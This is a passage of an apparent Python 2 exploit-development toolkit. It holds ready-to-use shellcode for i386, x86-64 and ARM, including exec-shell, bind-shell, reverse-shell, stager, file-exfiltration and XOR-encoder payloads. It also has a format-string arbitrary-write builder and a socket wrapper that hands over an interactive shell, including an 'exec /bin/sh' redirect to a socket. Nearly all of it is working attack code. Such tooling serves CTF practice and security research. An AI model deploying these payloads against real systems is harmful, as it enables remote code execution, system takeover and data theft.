            'read_stager': '\xeb\x0f\x59\x6a\x03\x58\x99\x89\xd3\x42\xc1\xe2\x0c\xcd\x80\xff\xe1\xe8\xec\xff\xff\xff',
            'mmap_stager': '\x6a\x5a\x58\x99\x89\xd1\x42\xc1\xe2\x0c\x51\x6a\xff\x6a\x22\x6a\x07\x52\x51\x89\xe3\xcd\x80\x91\x93\x8d\x43\x03\xcd\x80\xff\xe1',
            'alnum_stager': 'Yh3333k4dsFkDqG02DqH0D10u03P3H1o0j2B0207393s3q103a8P7l3j4s3B065k3O4N8N8O03',
            'bind_shell': '\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x66\x68${port}\x66\x6a\x02\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80',
            'reverse_shell': '\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68${host}\x66\x68${port}\x66\x6a\x02\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80',
            'xor': '\xeb\x0f\x5e\x80\x36${key}\x74\x0e\x46\xeb\xf8${key}${key}${key}${key}${key}${key}\xe8\xec\xff\xff\xff',
        },
        'x86-64': {
            'noppairs': ['PX', 'QY', 'RZ'],
            'exec_shell': '\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
            'exec_command': '\xeb\x31\x5e\x48\x31\xc9\x8a\x0e\x48\xff\xc6\x88\x2c\x0e\x6a\x3b\x58\x48\x99\x52\x66\x68\x2d\x63\x48\x89\xe3\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x56\x53\x57\x48\x89\xe6\x0f\x05\xe8\xca\xff\xff\xff',
            'dup': '\x6a${fd}\x5f\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x7d\xf6',
            'cat': '\xeb\x28\x5e\x48\x31\xc9\x8a\x0e\x48\xff\xc6\x88\x2c\x0e\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x52\x57\x48\x89\xe7\x52\x56\x57\x48\x89\xe6\x0f\x05\xe8\xd3\xff\xff\xff',
            'sendfile': '\xeb\x30\x5f\x48\x31\xc9\x8a\x0f\x48\xff\xc7\x88\x2c\x0f\x48\x31\xf6\x6a\x02\x58\x0f\x05\x48\x96\x48\x92\x6a${fd}\x5f\x6a\x01\x41\x5a\x49\xc1\xe2\x10\x6a\x28\x58\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xcb\xff\xff\xff',
            'read_stager': '\xeb\x13\x5e\x48\x31\xff\x48\x8d\x57\x01\x48\xc1\xe2\x0c\x48\x31\xc0\x0f\x05\xff\xe6\xe8\xe8\xff\xff\xff',
            'mmap_stager': '\x4d\x31\xc9\x6a\xff\x41\x58\x6a\x22\x41\x5a\x6a\x07\x5a\x49\x8d\x71\x01\x48\xc1\xe6\x0c\x48\x31\xff\x6a\x09\x58\x0f\x05\x48\x96\x48\x92\x48\x31\xc0\x0f\x05\xff\xe6',
            'alnum_stager': 'h0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M367p0h1O0A8O7p5L2x01193i4m7k08144L7m1M3K043I3A8L4V8K0m',
            'bind_shell': '\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\xba\xf2\xff${port}\x66\x83\xf2\xf0\x52\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
            'reverse_shell': '\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x68${host}\x66\x68${port}\x66\x6a\x02\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
            'xor': '\xeb\x0f\x5e\x80\x36${key}\x74\x0e\x48\xff\xc6\xeb\xf6${key}${key}${key}${key}\xe8\xec\xff\xff\xff',
        },
        'arm': {
            'exec_shell': '\x01\x70\x8f\xe2\x17\xff\x2f\xe1\x04\xa7\x03\xcf\x52\x40\x07\xb4\x68\x46\x05\xb4\x69\x46\x0b\x27\x01\xdf\x01\x01\x2f\x62\x69\x6e\x2f\x2f\x73\x68',
        },
    }

    def __init__(self, arch):
        if arch not in self._database:
            raise Exception("unsupported architechture: %r" % arch)
        self.arch = arch

    def get(self, name, **kwargs):
        if name not in self._database[self.arch]:
            raise Exception("unsupported shellcode for %s architecture: %r" % (arch, name))

        sc = self._database[self.arch][name]
        for k, v in kwargs.iteritems():
            sc = sc.replace("${%s}" % k, v)
        return sc

    def nopfill(self, code, size, buf=''):
        noppairs = self.get('noppairs')
        buflen = size - len(buf) - len(code)
        assert buflen >= 0, "%d bytes over" % (-buflen,)
        buf = ''
        while len(buf) < buflen:
            buf += random.choice(noppairs)
        return buf[:buflen] + code

    def exec_shell(self):
        return self.get('exec_shell')

    def exec_command(self, command):
        return self.get('exec_command') + chr(len(command)) + command

    def dup(self, code, fd):
        return self.get('dup', fd=chr(fd)) + code

    def cat(self, path):
        return self.get('cat') + chr(len(path)) + path

    def sendfile(self, path, fd=1):
        return self.get('sendfile', fd=chr(fd)) + chr(len(path)) + path

    def read_stager(self):
        return self.get('read_stager')

    def mmap_stager(self):
        return self.get('mmap_stager')

    def alnum_stager(self, reg):
        if self.arch == 'i386':
            r = ['eax', 'ecx', 'edx', 'ebx', 'esi', 'edi', 'esi', 'edi'].index(reg)
            return chr(0x50+r) + self.get('alnum_stager')
        elif self.arch == 'x86-64':
            r = ['rax', 'rcx', 'rdx', 'rbx', 'rsi', 'rdi', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11', 'r12', 'r13', 'r14', 'r15'].index(reg)
            if r >= 8:
                return '\x41' + chr(0x50+(r-8)) + self.get('alnum_stager')
            else:
                return chr(0x50+r) + self.get('alnum_stager')
        else:
            raise Exception("unsupported architecture: %r" % self.arch)

    def bind_shell(self, port):
        p = struct.pack('>H', port)
        return self.get('bind_shell', port=p)

    def reverse_shell(self, host, port):
        addrinfo = socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_STREAM)
        h, p = addrinfo[0][4]
        h = socket.inet_aton(h)
        p = struct.pack('>H', p)
        return self.get('reverse_shell', host=h, port=p)

    def xor(self, code, badchars='\x00\t\n\v\f\r '):
        for key in xrange(0x100):
            decoder = self.get('xor', key=chr(key))
            encoded_code = str(bytearray(c^key for c in bytearray(code)))
            result = decoder + encoded_code + chr(key)
            if all(c not in result for c in badchars):
                return result
        else:
            raise Exception('xor key not found')


class FormatStr(object):
    def __init__(self, offset=0):
        # i386 only
        self.offset = offset

    def dump_stack(self, size, start=None):
        buf = 'AAAA'
        if start > 1:
            i = start
            while len(buf) < size:
                buf += ".%%%d$08x" % i
                i += 1
        else:
            while len(buf) < size:
                buf += '.%08x'
        return buf[:size]

    def calc_offset(self, s):
        return s.split('.').index('41414141')

    def gets(self, addr):
        buf = p32(addr)
        buf += "%%%d$s" % self.offset
        return buf

    def write2(self, addr, value):
        buf = p32(addr)
        n = ((value-len(buf)-1) & 0xFFFF) + 1
        buf += "%%%dc%%%d$hn" % (n, self.offset)
        return buf

    def write4(self, addr, value):
        buf = p32([addr, addr+2])

        n = [value, (value>>16)]
        n[1] = ((n[1]-n[0]-1) & 0xFFFF) + 1
        n[0] = ((n[0]-len(buf)-1) & 0xFFFF) + 1

        buf += "%%%dc%%%d$hn" % (n[0], self.offset)
        buf += "%%%dc%%%d$hn" % (n[1], self.offset+1)

        return buf


class Proc(object):
    def __init__(self, *args, **kwargs):
        self.timeout = kwargs.get('timeout', 0.1)
        self.display = kwargs.get('display', False)
        self.debug = kwargs.get('debug', False)

        if 'host' in kwargs and 'port' in kwargs:
            self.s = socket.create_connection((kwargs['host'], kwargs['port']))
        else:
            self.s = self.connect_process(args)
        self.s.setblocking(0)

    def connect_process(self, cmd):
        def run_server(s, e, cmd):
            c, addr = s.accept()
            s.close()
            p = Popen(cmd, stdin=c, stdout=c, stderr=c)
            if self.debug:
                raw_input("\x1b[32mpid %d is running, attach the debugger if needed. Hit enter key to continue...\x1b[0m" % p.pid)
            e.set()
            p.wait()
            c.close()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('', 0))  # INADDR_ANY, INPORT_ANY
        s.listen(1)

        e = Event()
        t = Thread(target=run_server, args=(s, e, cmd))
        t.start()
        c = socket.create_connection(s.getsockname())
        e.wait()

        return c

    def write(self, s):
        select.select([], [self.s], [])
        self.s.sendall(s)

        if self.display:
            printable = re.sub(r'[^\s\x20-\x7e]', '.', s)
            sys.stdout.write("\x1b[33m%s\x1b[0m" % printable)  # yellow
            sys.stdout.flush()

    def read(self, size=-1, timeout=-1):
        if size < 0:
            chunk_size = 8192
            buf = ''
            while True:
                chunk = self.read(chunk_size, timeout)
                buf += chunk
                if len(chunk) < chunk_size:
                    break
            return buf

        if timeout == -1:
            timeout = self.timeout

        buf = ''
        while len(buf) < size:
            rlist, wlist, xlist = select.select([self.s], [], [], timeout)
            if not rlist:
                break
            chunk = self.s.recv(size-len(buf))
            if not chunk:
                break
            buf += chunk

        if self.display:
            printable = re.sub(r'[^\s\x20-\x7e]', '.', buf)
            sys.stdout.write("\x1b[36m%s\x1b[0m" % printable)  # cyan
            sys.stdout.flush()

        return buf

    def read_until(self, s):
        buf = self.read(len(s), None)
        while not buf.endswith(s):
            buf += self.read(1, None)
        return buf

    def expect(self, regexp):
        buf = ''
        while not re.search(regexp, buf):
            buf += self.read(1, None)
        return buf

    def readline(self):
        return self.read_until('\n')

    def writeline(self, s):
        return self.write(s+'\n')

    def shutdown(self, writeonly=False):
        if writeonly:
            self.s.shutdown(socket.SHUT_WR)
        else:
            self.s.shutdown(socket.SHUT_RDWR)
            self.s.close()

    def close(self):
        self.s.close()

    def wait(self, shell_fd=None):
        check_cmd = 'echo "\x1b[32mgot a shell!\x1b[0m"'  # green

        buf = self.read()
        sys.stdout.write(buf)

        if shell_fd is not None:
            self.write(check_cmd + '\n')
            sys.stdout.write(self.read())
            self.write("exec /bin/sh <&%(fd)d >&%(fd)d 2>&%(fd)d\n" % {'fd': shell_fd})
        t = Telnet()
        t.sock = self.s
        t.interact()
        self.shutdown()

    @contextmanager
    def listen(self, port=4444, echotest=False):
        check_cmd = 'echo "\x1b[32mgot a shell!\x1b[0m"'  # green

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('', 0))  # INADDR_ANY, INPORT_ANY
        s.listen(1)

        yield s.getsockname()

        c, addr = s.accept()
        s.close()
        if echotest:
            c.sendall(check_cmd + '\n')
            sys.stdout.write(c.recv(8192))

        t = Telnet()
        t.sock = c
        t.interact()
        c.shutdown(socket.SHUT_RDWR)
        c.close()
        self.shutdown()

    def pipe_output(self, *args):
        p = Popen(args, stdin=self.s, stdout=PIPE)
        stdout, stderr = p.communicate()
        return stdout

    def write_p64(self, s):
        return self.write(p64(s))

    def write_p32(self, s):
        return self.write(p32(s))

    def read_p64(self, timeout=None):
        return p64(self.read(8, timeout))

    def read_p32(self, timeout=None):
        return p32(self.read(4, timeout))


class Pattern(object):
    @classmethod
    def generate(cls):
        for x in xrange(0x41, 0x5b):
            for y in xrange(0x61, 0x7b):
                for z in xrange(0x30, 0x3a):
                    yield "%c%c%c" % (x, y, z)

    @classmethod
    def create(cls, size):
        s = ''
        for x in cls.generate():
            s += x
            if len(s) >= size:
                return s[:size]
        else:
            raise Exception("size too large")

    @classmethod
    def offset(cls, s):
        if s.startswith('0x'):
            addr = int16(s)
            if addr >> 32:
                chunk = p64(addr)
            else:
                chunk = p32(addr)
        else:
            chunk = s

        buf = ''
        for x in cls.generate():
            buf += x
            try:
                return buf.index(chunk)
            except ValueError:
                pass
        else:
            raise Exception("pattern not found")


class Asm(object):
    cmd = {
        'i386': {
            'as': ['as', '--32', '--msyntax=intel', '--mnaked-reg', '-o'],
            'objdump': ['objdump', '-M', 'intel', '-d'],
            'objdump_binary': ['objdump', '-b', 'binary', '-m', 'i386', '-M', 'intel,i386', '-D'],
        },
        'x86-64': {
            'as': ['as', '--64', '--msyntax=intel', '--mnaked-reg', '-o'],
            'objdump': ['objdump', '-M', 'intel', '-d'],
            'objdump_binary': ['objdump', '-b', 'binary', '-m', 'i386', '-M', 'intel,x86-64', '-D'],
        },
        'arm': {
            'as': ['as', '-o'],
            'objdump': ['objdump', '-d'],
            'objdump_binary': ['objdump', '-b', 'binary', '-m', 'arm', '-D'],
        },
        'thumb': {
            'as': ['as', '-mthumb', '-o'],
            'objdump': ['objdump', '-M', 'force-thumb', '-d'],
            'objdump_binary': ['objdump', '-b', 'binary', '-m', 'arm', '-M', 'force-thumb', '-D'],
        },
    }

    @classmethod
    def assemble(cls, s, arch):
        if arch in cls.cmd:
            cmd = cls.cmd[arch]
        else:
            raise Exception("unsupported architecture: %r" % arch)

        with tempfile.NamedTemporaryFile(delete=False) as f:
            p = Popen(cmd['as'] + [f.name], stdin=PIPE, stdout=PIPE, stderr=PIPE)
            stdout, stderr = p.communicate(s+'\n')
            if stderr:
                return stderr
            p = Popen(cmd['objdump'] + ['-w', f.name], stdout=PIPE)
            stdout, stderr = p.communicate()
            result = ''.join(stdout.splitlines(True)[7:])
            os.remove(f.name)
            return result

    @classmethod
    def disassemble(cls, blob, arch):
        if arch in cls.cmd:
            cmd = cls.cmd[arch]
        else:
            raise Exception("unsupported architecture: %r" % arch)

        with tempfile.NamedTemporaryFile() as f:
            f.write(blob)
            f.flush()
            if arch in ('arm', 'thumb'):
                p = Popen(cmd['objdump_binary'] + ['-EB', '-w', f.name], stdout=PIPE)
            else:
                p = Popen(cmd['objdump_binary'] + ['-w', f.name], stdout=PIPE)
            stdout, stderr = p.communicate()
            result = ''.join(stdout.splitlines(True)[7:])
            return result


if __name__ == '__main__':
    fmt_usage = "Usage: python %s [checksec|create|offset|gadget|scan|sc|asm|objdump] ..."

    if len(sys.argv) < 2:
        print >>sys.stderr, fmt_usage % sys.argv[0]
        sys.exit(1)
    cmd = sys.argv[1]

    if cmd == 'checksec':
        fpath = sys.argv[2] if len(sys.argv) > 2 else 'a.out'
        ELF(fpath).checksec()
    elif cmd == 'create':
        size = int(sys.argv[2]) if len(sys.argv) > 2 else 200
        print Pattern.create(size)
    elif cmd == 'offset':
        if len(sys.argv) < 3:
            print >>sys.stderr, "Usage: python %s offset [ADDRESS|STRING]" % sys.argv[0]
            sys.exit(1)
        print Pattern.offset(sys.argv[2])
    elif cmd == 'gadget':
        fpath = sys.argv[2] if len(sys.argv) > 2 else 'a.out'
        ROP(fpath).list_gadgets()
    elif cmd == 'scan':
        if len(sys.argv) < 3:
            print >>sys.stderr, "Usage: python %s scan REGEXP [FILE]" % sys.argv[0]
            sys.exit(1)
        regexp = sys.argv[2]
        fpath = sys.argv[3] if len(sys.argv) > 3 else 'a.out'
        ROP(fpath).scan_gadgets(regexp)
    elif cmd == 'sc':
        arch, kind = sys.argv[2].split('/', 1)
        args = [int(x) if x.isdigit() else x for x in sys.argv[3:]]
        s = getattr(Shellcode(arch), kind).__call__(*args)
        print ''.join("\\x%02x" % ord(x) for x in s)
    elif cmd == 'asm':
        if len(sys.argv) > 2 and sys.argv[2] == '-d':
            arch = sys.argv[3] if len(sys.argv) > 3 else 'i386'
            data = sys.stdin.read()
            if re.search(r'^[\s\dA-Fa-f]*$', data):
                data = ''.join(data.split()).decode('hex')
            print Asm.disassemble(data, arch).rstrip()
        else:
            arch = sys.argv[2] if len(sys.argv) > 2 else 'i386'
            data = sys.stdin.read()
            print Asm.assemble(data, arch).rstrip()
    elif cmd == 'objdump':
        fpath = sys.argv[2] if len(sys.argv) > 2 else 'a.out'
        ELF(fpath).objdump()
    else:
        print >>sys.stderr, fmt_usage % sys.argv[0]
        sys.exit(1)
